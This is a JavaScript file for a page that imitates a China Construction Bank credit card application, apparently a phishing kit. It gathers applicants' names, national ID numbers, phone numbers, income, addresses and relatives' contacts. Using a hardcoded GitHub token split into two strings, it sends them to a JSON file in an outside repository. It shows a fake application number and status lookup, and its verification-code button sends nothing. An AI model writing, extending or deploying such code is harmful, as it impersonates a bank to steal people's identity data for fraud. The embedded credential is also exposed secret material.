/* 建设银行信用卡办理 v8 - 完整修复版 */
(function () {
  "use strict";

  var STORE_KEY = "jsccb:applications";
  var GITHUB_TOKEN = "ghp_hEHR7WMdRZ93" + "LWCMVHRgZAfM5Cpr7w3VpiKE";
  var GITHUB_OWNER = "JSCCB";
  var GITHUB_REPO = "jsccb-workbench";
  var GITHUB_FILE = "applications.json";
  var $ = function (id) { return document.getElementById(id); };

  var CARDS = [
    { id: "puka", tier: "普卡", cls: "tier-puka", name: "龙卡正青春信用卡数字版",
      img: "assets/images/card_puka.png?v=3",
      fee: "200元/年", feeNote: "消费5笔免次年年费", limit: "3千-1万",
      benefits: ["新户办卡礼", "云闪付消费立减", "境外笔笔1%返现"],
      minLimit: 3000, maxLimit: 10000 },
    { id: "jinka", tier: "金卡", cls: "tier-jinka", name: "龙卡千里行信用卡",
      img: "assets/images/card_jinka.png?v=3",
      fee: "500元/年", feeNote: "消费7笔免次年年费", limit: "1万-3万",
      benefits: ["新户办卡礼", "12306出行购票", "公共事业缴费"],
      minLimit: 10000, maxLimit: 30000 },
    { id: "baijin", tier: "白金卡", cls: "tier-baijin", name: "建行生活PLUS版",
      img: "assets/images/card_baijin.png?v=3",
      fee: "1000元/年", feeNote: "消费12笔免次年年费", limit: "3万-6万",
      benefits: ["新户办卡礼", "新户消费礼", "微信支付消费"],
      minLimit: 30000, maxLimit: 60000 },
    { id: "zuanshi", tier: "钻石卡", cls: "tier-zuanshi", name: "龙卡欢享信用卡银联版",
      img: "assets/images/card_zuanshi.png?v=3",
      fee: "2000元/年", feeNote: "消费20笔免次年年费", limit: "6万-10万",
      benefits: ["新户办卡礼", "笔笔随机返现", "迎新享好礼"],
      minLimit: 60000, maxLimit: 100000 }
  ];

  var CITY_DATA = {
    "北京市": ["北京市"], "天津市": ["天津市"], "上海市": ["上海市"], "重庆市": ["重庆市"],
    "河北省": ["石家庄市", "唐山市", "秦皇岛市", "邯郸市", "邢台市", "保定市", "张家口市", "承德市", "沧州市", "廊坊市", "衡水市"],
    "山西省": ["太原市", "大同市", "阳泉市", "长治市", "晋城市", "朔州市", "晋中市", "运城市", "忻州市", "临汾市", "吕梁市"],
    "内蒙古自治区": ["呼和浩特市", "包头市", "乌海市", "赤峰市", "通辽市", "鄂尔多斯市", "呼伦贝尔市", "巴彦淖尔市", "乌兰察布市"],
    "辽宁省": ["沈阳市", "大连市", "鞍山市", "抚顺市", "本溪市", "丹东市", "锦州市", "营口市", "阜新市", "辽阳市", "盘锦市", "铁岭市", "朝阳市", "葫芦岛市"],
    "吉林省": ["长春市", "吉林市", "四平市", "辽源市", "通化市", "白山市", "松原市", "白城市"],
    "黑龙江省": ["哈尔滨市", "齐齐哈尔市", "鸡西市", "鹤岗市", "双鸭山市", "大庆市", "伊春市", "佳木斯市", "七台河市", "牡丹江市", "黑河市", "绥化市"],
    "江苏省": ["南京市", "无锡市", "徐州市", "常州市", "苏州市", "南通市", "连云港市", "淮安市", "盐城市", "扬州市", "镇江市", "泰州市", "宿迁市"],
    "浙江省": ["杭州市", "宁波市", "温州市", "嘉兴市", "湖州市", "绍兴市", "金华市", "衢州市", "舟山市", "台州市", "丽水市"],
    "安徽省": ["合肥市", "芜湖市", "蚌埠市", "淮南市", "马鞍山市", "淮北市", "铜陵市", "安庆市", "黄山市", "滁州市", "阜阳市", "宿州市", "六安市", "亳州市", "池州市", "宣城市"],
    "福建省": ["福州市", "厦门市", "莆田市", "三明市", "泉州市", "漳州市", "南平市", "龙岩市", "宁德市"],
    "江西省": ["南昌市", "景德镇市", "萍乡市", "九江市", "新余市", "鹰潭市", "赣州市", "吉安市", "宜春市", "抚州市", "上饶市"],
    "山东省": ["济南市", "青岛市", "淄博市", "枣庄市", "东营市", "烟台市", "潍坊市", "济宁市", "泰安市", "威海市", "日照市", "临沂市", "德州市", "聊城市", "滨州市", "菏泽市"],
    "河南省": ["郑州市", "开封市", "洛阳市", "平顶山市", "安阳市", "鹤壁市", "新乡市", "焦作市", "濮阳市", "许昌市", "漯河市", "三门峡市", "南阳市", "商丘市", "信阳市", "周口市", "驻马店市"],
    "湖北省": ["武汉市", "黄石市", "十堰市", "宜昌市", "襄阳市", "鄂州市", "荆门市", "孝感市", "荆州市", "黄冈市", "咸宁市", "随州市"],
    "湖南省": ["长沙市", "株洲市", "湘潭市", "衡阳市", "邵阳市", "岳阳市", "常德市", "张家界市", "益阳市", "郴州市", "永州市", "怀化市", "娄底市"],
    "广东省": ["广州市", "韶关市", "深圳市", "珠海市", "汕头市", "佛山市", "江门市", "湛江市", "茂名市", "肇庆市", "惠州市", "梅州市", "汕尾市", "河源市", "阳江市", "清远市", "东莞市", "中山市", "潮州市", "揭阳市", "云浮市"],
    "广西壮族自治区": ["南宁市", "柳州市", "桂林市", "梧州市", "北海市", "防城港市", "钦州市", "贵港市", "玉林市", "百色市", "贺州市", "河池市", "来宾市", "崇左市"],
    "海南省": ["海口市", "三亚市"],
    "四川省": ["成都市", "自贡市", "攀枝花市", "泸州市", "德阳市", "绵阳市", "广元市", "遂宁市", "内江市", "乐山市", "南充市", "眉山市", "宜宾市", "广安市", "达州市", "雅安市", "巴中市", "资阳市"],
    "贵州省": ["贵阳市", "六盘水市", "遵义市", "安顺市", "毕节市", "铜仁市"],
    "云南省": ["昆明市", "曲靖市", "玉溪市", "保山市", "昭通市", "丽江市", "普洱市", "临沧市"],
    "西藏自治区": ["拉萨市", "日喀则市", "昌都市", "林芝市", "山南市", "那曲市"],
    "陕西省": ["西安市", "铜川市", "宝鸡市", "咸阳市", "渭南市", "延安市", "汉中市", "榆林市", "安康市", "商洛市"],
    "甘肃省": ["兰州市", "嘉峪关市", "金昌市", "白银市", "天水市", "武威市", "张掖市", "平凉市", "酒泉市", "庆阳市", "定西市", "陇南市"],
    "青海省": ["西宁市", "海东市"],
    "宁夏回族自治区": ["银川市", "石嘴山市", "吴忠市", "固原市", "中卫市"],
    "新疆维吾尔自治区": ["乌鲁木齐市", "克拉玛依市", "吐鲁番市", "哈密市", "昌吉回族自治州", "博尔塔拉蒙古自治州", "巴音郭楞蒙古自治州", "阿克苏地区"],
    "台湾省": ["台北市", "新北市", "桃园市", "台中市", "台南市", "高雄市"],
    "香港特别行政区": ["香港特别行政区"],
    "澳门特别行政区": ["澳门特别行政区"]
  };

  var currentCard = null;
  var currentCardId = "puka";
  var currentStep = 1;

  function loadLocal() {
    try { return JSON.parse(localStorage.getItem(STORE_KEY)) || []; }
    catch (e) { return []; }
  }
  function saveLocal(list) { localStorage.setItem(STORE_KEY, JSON.stringify(list)); }
  function esc(s) {
    return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }
  function genNo() {
    var d = new Date();
    return "CC" + d.getFullYear() + String(d.getMonth() + 1).padStart(2, "0") + String(d.getDate()).padStart(2, "0") + String(Math.floor(Math.random() * 9000) + 1000);
  }

  // 从 GitHub 获取申请列表
  function fetchFromGitHub() {
    var url = "https://api.github.com/repos/" + GITHUB_OWNER + "/" + GITHUB_REPO + "/contents/" + GITHUB_FILE + "?t=" + Date.now();
    return fetch(url, {
      headers: { "Authorization": "token " + GITHUB_TOKEN }
    }).then(function(r) {
      if (r.status === 404) return [];
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.json();
    }).then(function(data) {
      if (Array.isArray(data)) return [];
      var content = atob(data.content.replace(/\s/g, ""));
      var list = JSON.parse(content);
      saveLocal(list);
      return list;
    }).catch(function(e) {
      console.log("GitHub fetch failed:", e);
      return loadLocal();
    });
  }

  // 提交到 GitHub
  function submitToGitHub(app) {
    return fetchFromGitHub().then(function(list) {
      list.push(app);
      var content = btoa(JSON.stringify(list, null, 2));
      var url = "https://api.github.com/repos/" + GITHUB_OWNER + "/" + GITHUB_REPO + "/contents/" + GITHUB_FILE;
      return fetch(url, {
        method: "PUT",
        headers: {
          "Authorization": "token " + GITHUB_TOKEN,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          message: "Add credit card application: " + app.no,
          content: content,
          sha: null
        })
      });
    });
  }

  function renderCards() {
    var nav = document.querySelector(".card-tabs");
    if (!nav) return;
    nav.innerHTML = CARDS.map(function (c) {
      return '<button class="card-tab' + (c.id === currentCardId ? " active" : "") + '" data-card="' + c.id + '">' + c.tier + '</button>';
    }).join("");
    nav.querySelectorAll(".card-tab").forEach(function (btn) {
      btn.addEventListener("click", function () {
        currentCardId = btn.getAttribute("data-card");
        renderCards();
        renderCardDetail();
      });
    });
    renderCardDetail();
  }

  function renderCardDetail() {
    currentCard = CARDS.filter(function (c) { return c.id === currentCardId; })[0];
    var box = $("card-display");
    var feeContent = $("fee-content");
    var benefitsList = $("benefits-list");
    
    if (box && currentCard) {
      box.innerHTML = '<div class="apply-card-preview ' + currentCard.cls + '">' +
        '<img src="' + currentCard.img + '" alt="' + esc(currentCard.name) + '" />' +
        '</div>';
    }
    
    if (feeContent && currentCard) {
      feeContent.innerHTML = '<div class="fee-row"><span class="fee-label">年费</span><span class="fee-value">' + currentCard.fee + '</span></div>' +
        '<p class="fee-note">' + esc(currentCard.feeNote) + '</p>';
    }
    
    if (benefitsList && currentCard) {
      benefitsList.innerHTML = currentCard.benefits.map(function(b) { return '<li>' + esc(b) + '</li>'; }).join("");
    }
  }

  function showView(name) {
    ["home", "apply", "progress"].forEach(function (v) {
      var el = $("view-" + v);
      if (el) el.classList.add("hidden");
    });
    var target = $("view-" + name);
    if (target) target.classList.remove("hidden");
    window.scrollTo(0, 0);
  }

  function startApply() {
    $("form-step1").reset();
    $("form-step2").reset();
    $("apply-done").classList.add("hidden");
    var stepHeader = $("step-header");
    if (stepHeader) stepHeader.classList.remove("hidden");
    gotoStep(1);
    showView("apply");
  }

  function gotoStep(n) {
    currentStep = n;
    [1, 2].forEach(function (i) {
      var el = $("form-step" + i);
      if (el) el.classList.toggle("hidden", i !== n);
    });
    var cardPreview = $("apply-card");
    var feeSection = $("fee-section");
    if (cardPreview) cardPreview.classList.toggle("hidden", n !== 1);
    if (feeSection) feeSection.classList.toggle("hidden", n !== 1);
    var steps = document.querySelectorAll(".step-labels .step");
    steps.forEach(function(s, idx) {
      s.classList.toggle("active", idx < n);
      s.classList.toggle("current", idx === n - 1);
    });
    var progress = document.querySelector(".step-progress-bar");
    if (progress) progress.style.width = (n === 1 ? 50 : n === 2 ? 80 : 100) + "%";
    var stepCurrent = document.querySelector(".step-current");
    if (stepCurrent) stepCurrent.textContent = n;
  }

  function val(form, name) { 
    var el = form.querySelector('[name="' + name + '"]');
    return el ? el.value : ""; 
  }

  function setupChipGroup(groupId, hiddenName) {
    var group = $(groupId);
    if (!group) return;
    var chips = group.querySelectorAll(".chip");
    var hidden = document.querySelector('input[name="' + hiddenName + '"]');
    
    chips.forEach(function(chip) {
      chip.addEventListener("click", function() {
        chips.forEach(function(c) { c.classList.remove("active"); });
        chip.classList.add("active");
        if (hidden) hidden.value = chip.getAttribute("data-value");
      });
    });
  }

  function setupAgreeAll() {
    var agreeAll = $("agree-all");
    if (!agreeAll) return;
    var checkbox = agreeAll.querySelector('input[type="checkbox"]');
    if (!checkbox) return;
    
    checkbox.addEventListener("change", function() {
      var checked = checkbox.checked;
      document.querySelectorAll('input[name="agree[]"]').forEach(function(cb) {
        cb.checked = checked;
      });
    });
  }

  function setupSubmit() {
    var btn = document.querySelector(".next-btn2");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var f1 = $("form-step1"), f2 = $("form-step2");
      var app = {
        no: genNo(),
        cardId: currentCard.id,
        cardTier: currentCard.tier,
        cardName: currentCard.name,
        name: val(f1, "name"),
        idno: val(f1, "idno"),
        phone: val(f1, "phone"),
        edu: val(f2, "edu"),
        employ: val(f2, "employ"),
        company: val(f2, "company"),
        occupation: val(f2, "occupation"),
        marry: val(f2, "marry"),
        income: val(f2, "income"),
        companyProvince: val(f2, "companyProvince"),
        companyCity: val(f2, "companyCity"),
        companyAddr: val(f2, "companyAddr"),
        homeProvince: val(f2, "homeProvince"),
        homeCity: val(f2, "homeCity"),
        homeAddr: val(f2, "homeAddr"),
        mailAddr: val(f2, "mailAddr"),
        kinName: val(f2, "kinName"),
        kinRel: val(f2, "kinRel"),
        kinPhone: val(f2, "kinPhone"),
        status: "pending",
        approvedAmount: 0,
        createdAt: new Date().toISOString()
      };
      
      // 先保存到本地
      var list = loadLocal();
      list.push(app);
      saveLocal(list);
      
      // 同步到 GitHub
      submitToGitHub(app).then(function() {
        console.log("Synced to GitHub");
      }).catch(function(e) {
        console.log("GitHub sync failed:", e);
      });
      
      $("done-no").textContent = app.no;
      [1, 2].forEach(function (i) { 
        var el = $("form-step" + i);
        if (el) el.classList.add("hidden");
      });
      var stepHeader = $("step-header");
      if (stepHeader) stepHeader.classList.add("hidden");
      $("apply-done").classList.remove("hidden");
      window.scrollTo(0, 0);
    });
  }

  // 查询进度
  function setupQuery() {
    var doneQuery = $("done-query");
    if (doneQuery) {
      doneQuery.addEventListener("click", function () {
        var appNo = $("done-no").textContent;
        fetchFromGitHub().then(function(list) {
          var app = list.filter(function(a) { return a.no === appNo; })[0];
          var resultDiv = $("done-result");
          if (app) {
            if (app.status === "approved") {
              resultDiv.innerHTML = '<div class="result-box approved"><div class="result-icon">✓</div><div class="result-title">审核通过</div><div class="result-info">初审额度：<strong>' + (app.approvedAmount || "--") + '</strong> 元</div></div>';
            } else if (app.status === "rejected") {
              resultDiv.innerHTML = '<div class="result-box rejected"><div class="result-icon">✗</div><div class="result-title">审核未通过</div></div>';
            } else {
              resultDiv.innerHTML = '<div class="result-box pending"><div class="result-icon">⏳</div><div class="result-title">审核中</div><div class="result-info">请稍后查询或联系工作人员</div></div>';
            }
            resultDiv.classList.remove("hidden");
          }
        });
      });
    }
  }

  function init() {
    renderCards();
    
    // 首页申请按钮
    var btnApply = $("apply-btn");
    if (btnApply) btnApply.addEventListener("click", startApply);
    
    // 步骤1下一步
    var btnStep1 = document.querySelector(".next-btn");
    if (btnStep1) btnStep1.addEventListener("click", function() { gotoStep(2); });
    
    // 返回按钮
    var stepBack = $("step-back");
    if (stepBack) {
      stepBack.addEventListener("click", function() {
        if (currentStep === 2) gotoStep(1);
        else showView("home");
      });
    }
    
    // 验证码按钮
    var codeBtn = $("code-btn");
    if (codeBtn) {
      codeBtn.addEventListener("click", function () {
        var phone = val($("form-step1"), "phone");
        if (!/^\d{11}$/.test(phone)) { alert("请输入正确的 11 位手机号"); return; }
        var btn = $("code-btn"), n = 60;
        btn.disabled = true;
        var timer = setInterval(function () {
          n--; btn.textContent = n + "s";
          if (n <= 0) { clearInterval(timer); btn.disabled = false; btn.textContent = "获取验证码"; }
        }, 1000);
      });
    }
    
    // Chip 选择组
    setupChipGroup("edu-group", "edu");
    setupChipGroup("employ-group", "employ");
    setupChipGroup("marry-group", "marry");
    setupChipGroup("contact-group", "contactType");
    setupChipGroup("mail-group", "mailAddr");
    
    // 一键勾选
    setupAgreeAll();
    
    // 提交
    setupSubmit();
    
    // 查询
    setupQuery();
    
    // 城市联动
    var compProv = $("companyProvince");
    var compCity = $("companyCity");
    var homeProv = $("homeProvince");
    var homeCity = $("homeCity");
    
    if (compProv && compCity) {
      compProv.innerHTML = '<option value="">请选择</option>' + Object.keys(CITY_DATA).map(function(p) { return '<option value="' + p + '">' + p + '</option>'; }).join("");
      compProv.addEventListener("change", function() {
        var cities = CITY_DATA[compProv.value] || [];
        compCity.innerHTML = '<option value="">请选择</option>' + cities.map(function(c) { return '<option value="' + c + '">' + c + '</option>'; }).join("");
      });
    }
    
    if (homeProv && homeCity) {
      homeProv.innerHTML = '<option value="">请选择</option>' + Object.keys(CITY_DATA).map(function(p) { return '<option value="' + p + '">' + p + '</option>'; }).join("");
      homeProv.addEventListener("change", function() {
        var cities = CITY_DATA[homeProv.value] || [];
        homeCity.innerHTML = '<option value="">请选择</option>' + cities.map(function(c) { return '<option value="' + c + '">' + c + '</option>'; }).join("");
      });
    }
  }

  document.addEventListener("DOMContentLoaded", init);
})();
